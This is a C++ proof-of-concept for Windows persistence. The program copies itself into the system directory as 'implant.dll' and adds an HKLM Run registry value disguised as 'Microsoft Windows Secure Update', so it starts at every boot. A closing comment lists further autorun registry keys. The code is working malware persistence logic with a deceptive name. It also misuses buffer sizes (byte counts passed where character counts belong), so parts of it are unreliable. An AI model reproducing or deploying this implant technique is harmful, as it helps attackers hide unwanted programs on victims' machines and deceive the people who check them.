/*
PoC to automatically run program on startup...

Run a program automatically when Windows starts

tested at windows 7, windows XP

*Credit*
https://github.com/CoolerVoid/X_files/blob/master/src/automatically_run_proc_startup.cpp

*/
#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <stdio.h>
#include <memory>

// run at 32bit and 64bit
#define KEY_WOW64_32KEY 0x0200
#define KEY_WOW64_64KEY 0x0100
#if defined(_WIN64)
 #define CROSS_ACCESS KEY_WOW64_32KEY
#else
 #define CROSS_ACCESS KEY_WOW64_64KEY
#endif

int main(int argc, char *argv[])
{
// copy program implant.dll to system32 directory
 wchar_t system2[MAX_PATH];
 wchar_t pathtofile[MAX_PATH];
 HMODULE ModPath = GetModuleHandle(NULL);
 GetModuleFileName(ModPath,pathtofile,sizeof(pathtofile));
 GetSystemDirectory(system2,sizeof(system2));
 wcscat(system2,L"\\implant.dll"); // your program name at second argv, use strlcat() ;-) FIND wchar version of strcat!!
 CopyFile(pathtofile,system2,false);

// write registry entries
 HKEY hKey;
 RegOpenKeyEx(HKEY_LOCAL_MACHINE,L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE | CROSS_ACCESS,&hKey );
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms724923%28v=vs.85%29.aspx
 RegSetValueEx(hKey, L"Microsoft Windows Secure Update",0,REG_SZ,(const unsigned char*)system2,sizeof(system2));
 RegCloseKey(hKey);

// just another test
 std::wcout << L"l333t";
 setvbuf(stdout, NULL, _IOLBF, 0);
 system("PAUSE");
 return EXIT_SUCCESS;
}
/*
Other options

 You can run an application automatically by writing a value entry (a complete name/value pair) to any of the following registry keys (I'll use abbreviations here for the top-level keys):

HKCU\Software\Microsoft\Windows\CurrentVersion\Run

    Launches a program automatically when a particular user logs in. This key is used when you always want to launch a program when a particular user is using a system.

HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

    Launches a program the next time the user logs in and removes its value entry from the registry. This key is typically used by installation programs.

HKLM\Software\Microsoft\Windows\CurrentVersion\Run

    Launches a program automatically at system startup. This key is used when you always want to launch a program on a particular system.

HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

    Launches a program the next time the system starts and removes its value entry from the registry. This key is typically used by installation programs.

HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices

    Launches a service (a standard NT service or a background process) automatically at startup. An example of a service is a Web server such as Microsoft Internet Information Server.

HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce

    Launches a service (a standard NT service or a background process) the next time the system is started, then removes its value entry from the registry.



*/